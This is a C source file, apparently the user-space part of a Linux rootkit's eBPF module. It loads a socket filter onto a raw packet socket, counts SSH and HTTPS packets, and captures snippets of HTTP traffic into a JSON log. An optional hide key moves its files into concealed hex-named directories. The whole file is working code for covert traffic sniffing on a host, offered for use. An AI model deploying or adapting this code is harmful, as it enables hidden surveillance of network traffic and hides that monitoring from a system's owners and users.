/**
* ebpf-kovid.c
**/

#include <arpa/inet.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include <errno.h>
#include <linux/if_packet.h>
#include <net/ethernet.h>
#include <netinet/in.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <unistd.h>

// By default, still point to "/usr/bin/socket_filter_bpf.o".
static char bpf_object_file[128] = "/usr/bin/socket_filter_bpf.o";
static char bpf_artefact[128] = "/tmp/ebpf_kovid.json";
static const char *bpf_prog_section = "socket";
static const char *bpf_map_name = "port_count_map";
static const char *http_snippet_map_name = "http_snippet_map";

uint64_t auto_ebpfhidenkey = 0x0000000000000000;

#define HTTP_MAX_BYTES 64

struct http_snippet {
	unsigned char data[HTTP_MAX_BYTES];
	unsigned int used;
};

static int prog_fd = -1, map_fd = -1, snippet_map_fd = -1;
static int sock_fd = -1;
static struct bpf_object *obj = NULL;
static FILE *fp = NULL;
static int snapshot_count = 0;

//----------------------------------------------------------------------
// Utility: JSON-escape a string (quotes, backslash, control chars).
//----------------------------------------------------------------------
static void json_escape_and_print(FILE *fp, const char *str)
{
	for (; *str; str++) {
		unsigned char c = (unsigned char)*str;
		switch (c) {
		case '\\':
			fputs("\\\\", fp);
			break;
		case '"':
			fputs("\\\"", fp);
			break;
		case '\b':
			fputs("\\b", fp);
			break;
		case '\f':
			fputs("\\f", fp);
			break;
		case '\n':
			fputs("\\n", fp);
			break;
		case '\r':
			fputs("\\r", fp);
			break;
		case '\t':
			fputs("\\t", fp);
			break;
		default:
			if (c < 0x20) {
				// control char => \u00XX
				fprintf(fp, "\\u%04x", c);
			} else {
				fputc(c, fp);
			}
			break;
		}
	}
}

//----------------------------------------------------------------------
// Minimal parse of snippet for "status" if it starts with "HTTP/1."
//----------------------------------------------------------------------
static int parse_http_snippet(const unsigned char *buf, int buf_len,
			      int *is_request, char *ascii_out,
			      int ascii_out_len)
{
	int status = 0;
	*is_request = 0;

	// Convert snippet to ASCII, replacing non-printables with '.'
	for (int i = 0; i < buf_len && i < ascii_out_len - 1; i++) {
		unsigned char c = buf[i];
		if (c >= 32 && c <= 126) {
			ascii_out[i] = c;
		} else {
			ascii_out[i] = '.';
		}
	}
	ascii_out[(buf_len < ascii_out_len - 1) ? buf_len : (ascii_out_len - 1)] =
		'\0';

	// If snippet starts with "HTTP/1."
	if (buf_len >= 9 && !memcmp(buf, "HTTP/1.", 7)) {
		if (buf_len >= 13 && buf[8] == ' ') {
			if (buf[9] >= '0' && buf[9] <= '9' && buf[10] >= '0' &&
			    buf[10] <= '9' && buf[11] >= '0' &&
			    buf[11] <= '9') {
				int hundreds = (buf[9] - '0') * 100;
				int tens = (buf[10] - '0') * 10;
				int ones = (buf[11] - '0');
				status = hundreds + tens + ones;
			}
		}
	} else {
		// Possibly a request (e.g. "GET ")
		if (buf_len >= 4 &&
		    (!memcmp(buf, "GET ", 4) || !memcmp(buf, "POST", 4) ||
		     !memcmp(buf, "HEAD", 4))) {
			*is_request = 1;
		}
	}

	return status;
}

//----------------------------------------------------------------------
// SIGINT or SIGTERM => close JSON array & exit
//----------------------------------------------------------------------
static void cleanup_and_exit(int sig)
{
	if (fp) {
		fprintf(fp, "\n]\n");
		fclose(fp);
		fp = NULL;
	}
	if (sock_fd >= 0)
		close(sock_fd);
	if (obj)
		bpf_object__close(obj);

	fprintf(stderr, "\nCaught signal %d. Exiting.\n", sig);
	exit(0);
}

int main(int argc, char **argv)
{
	if (auto_ebpfhidenkey != 0) {
		snprintf(bpf_object_file, sizeof(bpf_object_file),
			 "/usr/bin/0x%llx/socket_filter_bpf.o",
			 (unsigned long long)auto_ebpfhidenkey);
		snprintf(bpf_artefact, sizeof(bpf_artefact),
			 "/tmp/0x%llx/ebpf_kovid.json",
			 (unsigned long long)auto_ebpfhidenkey);
	}

	struct bpf_program *prog = NULL;
	struct bpf_map *map = NULL, *snippet_map = NULL;
	int err;

	signal(SIGINT, cleanup_and_exit);
	signal(SIGTERM, cleanup_and_exit);

	// Open + load BPF object
	obj = bpf_object__open_file(bpf_object_file, NULL);
	if (!obj) {
		fprintf(stderr, "ERROR: bpf_object__open_file(%s) failed\n",
			bpf_object_file);
		return 1;
	}
	err = bpf_object__load(obj);
	if (err) {
		fprintf(stderr, "ERROR: bpf_object__load() failed\n");
		goto cleanup;
	}

	// Find program
	prog = bpf_object__find_program_by_title(obj, bpf_prog_section);
	if (!prog) {
		fprintf(stderr, "ERROR: couldn't find program section '%s'\n",
			bpf_prog_section);
		goto cleanup;
	}
	prog_fd = bpf_program__fd(prog);
	if (prog_fd < 0) {
		fprintf(stderr, "ERROR: bpf_program__fd() failed\n");
		goto cleanup;
	}

	// Find port_count_map
	map = bpf_object__find_map_by_name(obj, bpf_map_name);
	if (!map) {
		fprintf(stderr, "ERROR: couldn't find map '%s'\n",
			bpf_map_name);
		goto cleanup;
	}
	map_fd = bpf_map__fd(map);
	if (map_fd < 0) {
		fprintf(stderr, "ERROR: bpf_map__fd(%s) failed\n",
			bpf_map_name);
		goto cleanup;
	}

	// Find http_snippet_map
	snippet_map = bpf_object__find_map_by_name(obj, http_snippet_map_name);
	if (!snippet_map) {
		fprintf(stderr, "ERROR: couldn't find map '%s'\n",
			http_snippet_map_name);
		goto cleanup;
	}
	snippet_map_fd = bpf_map__fd(snippet_map);
	if (snippet_map_fd < 0) {
		fprintf(stderr, "ERROR: bpf_map__fd(%s) failed\n",
			http_snippet_map_name);
		goto cleanup;
	}

	// Create raw AF_PACKET socket & attach eBPF
	sock_fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (sock_fd < 0) {
		perror("socket(AF_PACKET, SOCK_RAW, ETH_P_ALL)");
		goto cleanup;
	}
	err = setsockopt(sock_fd, SOL_SOCKET, SO_ATTACH_BPF, &prog_fd,
			 sizeof(prog_fd));
	if (err) {
		perror("setsockopt(SO_ATTACH_BPF)");
		goto cleanup;
	}

	fp = fopen(bpf_artefact, "w");
	if (!fp) {
		perror("ERROR: Could not open ebpf_kovid.json for writing.");
		goto cleanup;
	}

	fprintf(fp, "[\n");
	fflush(fp);

	__u16 ports[2] = { 22, 443 };

	// Main loop
	while (1) {
		if (snapshot_count > 0) {
			fprintf(fp, ",\n");
		}

		fprintf(fp, "{\n  \"snapshot\": [\n");

		for (int i = 0; i < 2; i++) {
			__u64 value = 0;
			if (bpf_map_lookup_elem(map_fd, &ports[i], &value) ==
			    0) {
				fprintf(fp,
					"    { \"port\": %u, \"packets\": %llu }%s\n",
					ports[i], value, (i == 0 ? "," : ""));
			} else {
				fprintf(fp,
					"    { \"port\": %u, \"packets\": 0 }%s\n",
					ports[i], (i == 0 ? "," : ""));
			}
		}

		fprintf(fp, "  ],\n");

		// snippet
		{
			__u32 key = 0;
			struct http_snippet snippet;
			memset(&snippet, 0, sizeof(snippet));

			if (bpf_map_lookup_elem(snippet_map_fd, &key,
						&snippet) == 0) {
				if (snippet.used == 1) {
					int is_request = 0;
					int status_code = 0;
					char ascii_buf[HTTP_MAX_BYTES + 1];
					int len = HTTP_MAX_BYTES;

					status_code = parse_http_snippet(
						snippet.data, len, &is_request,
						ascii_buf, sizeof(ascii_buf));

					// If found status code, print it
					if (status_code > 0) {
						fprintf(fp,
							"  \"status\": %d,\n",
							status_code);
					} else {
						fprintf(fp,
							"  \"status\": null,\n");
					}

					fprintf(fp, "  \"len\": %d,\n", len);

					// JSON-escape the ascii_buf
					fprintf(fp, "  \"content\": \"");
					json_escape_and_print(fp, ascii_buf);
					fprintf(fp, "\",\n");

					// Mark snippet as used=0
					snippet.used = 0;
					bpf_map_update_elem(snippet_map_fd,
							    &key, &snippet,
							    BPF_ANY);
				} else {
					fprintf(fp, "  \"status\": null,\n");
					fprintf(fp, "  \"len\": 0,\n");
					fprintf(fp, "  \"content\": null,\n");
				}
			} else {
				fprintf(fp, "  \"status\": null,\n");
				fprintf(fp, "  \"len\": 0,\n");
				fprintf(fp, "  \"content\": null,\n");
			}
		}

		fprintf(fp, "  \"note\": \"another snapshot\"\n}\n");
		fflush(fp);

		snapshot_count++;
		sleep(5);
	}

cleanup:
	if (fp) {
		fprintf(fp, "\n]\n");
		fclose(fp);
		fp = NULL;
	}
	if (sock_fd >= 0)
		close(sock_fd);
	if (obj)
		bpf_object__close(obj);
	return 0;
}
